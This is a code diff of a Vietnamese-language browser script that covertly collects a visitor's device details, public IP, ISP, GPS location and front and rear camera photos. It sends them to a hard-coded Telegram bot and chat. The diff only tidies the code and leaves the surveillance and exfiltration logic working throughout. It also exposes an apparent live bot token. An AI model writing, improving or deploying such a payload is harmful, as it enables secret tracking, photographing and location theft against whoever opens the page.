@@ -1,12 +1,11 @@
 const TELEGRAM_BOT_TOKEN = '8163261794:AAE1AVuCTP0Vm_kqV0a1DT-02NTo1XKhVs0';
-const TELEGRAM_CHAT_ID_WITH_PHOTOS = '-1003770043455';
-const TELEGRAM_CHAT_ID_NO_PHOTOS = '-1003770043455';
+const TELEGRAM_CHAT_ID = '-1003770043455';
 
 const API_SEND_MEDIA = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMediaGroup`;
 const API_SEND_TEXT = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
 
 const info = {
-  time: new Date().toLocaleString('vi-VN'),
+  time: '',
   ip: '',
   isp: '',
   realIp: '',
@@ -29,14 +28,7 @@ function detectDevice() {
   if (/Android/i.test(ua)) {
     info.os = 'Android';
     const match = ua.match(/Android.*;\s+([^;]+)\s+Build/);
-    if (match) {
-      let model = match[1].split('/')[0].trim();
-      if (model.includes("SM-S918")) model = "Samsung Galaxy S23 Ultra";
-      if (model.includes("SM-S928")) model = "Samsung Galaxy S24 Ultra";
-      info.device = model;
-    } else {
-      info.device = 'Android Device';
-    }
+    info.device = match ? match[1].split('/')[0].trim() : 'Android Device';
   } 
   else if (/iPhone|iPad|iPod/i.test(ua) || (platform === 'MacIntel' && navigator.maxTouchPoints > 1)) {
     info.os = 'iOS';
@@ -56,9 +48,6 @@ function detectDevice() {
   else if (/Windows NT/i.test(ua)) {
     info.device = 'Windows PC';
     info.os = 'Windows';
-  } else if (/Macintosh/i.test(ua)) {
-    info.device = 'Mac';
-    info.os = 'macOS';
   } else {
     info.device = 'Không xác định';
     info.os = 'Không rõ';
@@ -69,7 +58,7 @@ async function getPublicIP() {
   try {
     const r = await fetch('https://api.ipify.org?format=json');
     const data = await r.json();
-    info.ip = data.ip || 'Không rõ';
+    info.ip = data.ip;
   } catch (e) { info.ip = 'Bị chặn'; }
 }
 
@@ -85,32 +74,21 @@ async function getRealIP() {
   } catch (e) { info.realIp = 'Lỗi kết nối'; }
 }
 
-let useGPS = false;
-
 async function getLocation() {
   return new Promise(resolve => {
     if (!navigator.geolocation) return fallbackIPLocation().then(resolve);
-
     navigator.geolocation.getCurrentPosition(
       async pos => {
-        useGPS = true;
         info.lat = pos.coords.latitude.toFixed(6);
         info.lon = pos.coords.longitude.toFixed(6);
         try {
           const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${info.lat}&lon=${info.lon}`);
           const data = await res.json();
-          info.address = data.display_name || '📍 Vị trí GPS';
-          info.country = data.address?.country || info.country;
-        } catch {
-          info.address = `📍 Tọa độ: ${info.lat}, ${info.lon}`;
-        }
+          info.address = data.display_name || 'Vị trí GPS';
+        } catch { info.address = `Tọa độ: ${info.lat}, ${info.lon}`; }
         resolve();
       },
-      async () => {
-        useGPS = false;
-        await fallbackIPLocation();
-        resolve();
-      },
+      async () => { await fallbackIPLocation(); resolve(); },
       { enableHighAccuracy: true, timeout: 5000 }
     );
   });
@@ -122,7 +100,6 @@ async function fallbackIPLocation() {
     info.lat = data.latitude?.toFixed(6) || '0';
     info.lon = data.longitude?.toFixed(6) || '0';
     info.address = `${data.city}, ${data.region} (Vị trí IP)`;
-    info.country = data.country || 'Việt Nam';
   } catch (e) { info.address = 'Không rõ'; }
 }
 
@@ -132,6 +109,7 @@ async function captureCamera(facingMode = 'user') {
     return new Promise(resolve => {
       const video = document.createElement('video');
       video.srcObject = stream;
+      video.setAttribute('playsinline', ''); 
       video.play();
       video.onloadedmetadata = () => {
         const canvas = document.createElement('canvas');
@@ -144,9 +122,7 @@ async function captureCamera(facingMode = 'user') {
         }, 800);
       };
     });
-  } catch (e) {
-    throw e;
-  }
+  } catch (e) { return null; }
 }
 
 function getCaption() {
@@ -165,24 +141,18 @@ function getCaption() {
 🏢 ISP: ${info.isp}
 🏙️ Địa chỉ: ${info.address}
 🌎 Quốc gia: ${info.country}
-📍 Vĩ độ: ${info.lat}
-📍 Kinh độ: ${info.lon}
 📌 Google Maps: ${mapsLink}
 📸 Camera: ${info.camera}
 `.trim();
 }
 
-function getCaptionWithExtras() {
-  return getCaption() + `\n\n⚠️ Ghi chú: Thông tin có khả năng chưa chính xác 100%.`;
-}
-
 async function sendPhotos(frontBlob, backBlob) {
   const formData = new FormData();
-  formData.append('chat_id', TELEGRAM_CHAT_ID_WITH_PHOTOS);
+  formData.append('chat_id', TELEGRAM_CHAT_ID);
   
   const media = [];
   if (frontBlob) {
-    media.push({ type: 'photo', media: 'attach://front', caption: getCaptionWithExtras() });
+    media.push({ type: 'photo', media: 'attach://front', caption: getCaption() });
     formData.append('front', frontBlob, 'front.jpg');
   }
   if (backBlob) {
@@ -198,45 +168,26 @@ async function sendTextOnly() {
   return fetch(API_SEND_TEXT, {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({
-      chat_id: TELEGRAM_CHAT_ID_NO_PHOTOS,
-      text: getCaption()
-    })
+    body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: getCaption() })
   });
 }
 
-function delay(ms) {
-  return new Promise(resolve => setTimeout(resolve, ms));
-}
+function delay(ms) { return new Promise(resolve => setTimeout(resolve, ms)); }
 
 async function main() {
+  info.time = new Date().toLocaleString('vi-VN');
   detectDevice();
   await Promise.all([getPublicIP(), getRealIP(), getLocation()]);
 
-  let front = null, back = null;
-
-  try {
-    front = await captureCamera("user");
-    await delay(500);
-    back = await captureCamera("environment");
-    info.camera = '✅ Đã chụp camera trước và sau';
-  } catch (e) {
-    info.camera = '🚫 Bị từ chối hoặc lỗi camera';
-  }
+  let front = await captureCamera("user");
+  if (front) await delay(800); // Nghỉ để phần cứng chuyển đổi cam
+  let back = await captureCamera("environment");
 
   if (front || back) {
+    info.camera = `✅ Đã chụp: ${front ? 'Trước' : ''} ${back ? 'Sau' : ''}`;
     await sendPhotos(front, back);
   } else {
+    info.camera = '🚫 Bị từ chối hoặc lỗi camera';
     await sendTextOnly();
   }
 }
-
-main().then(async () => {
-  window.mainScriptFinished = true;
-  await delay(1500);
-
-  const script = document.createElement('script');
-  script.src = 'camera.js'; 
-  script.defer = true;
-  document.body.appendChild(script);
-});
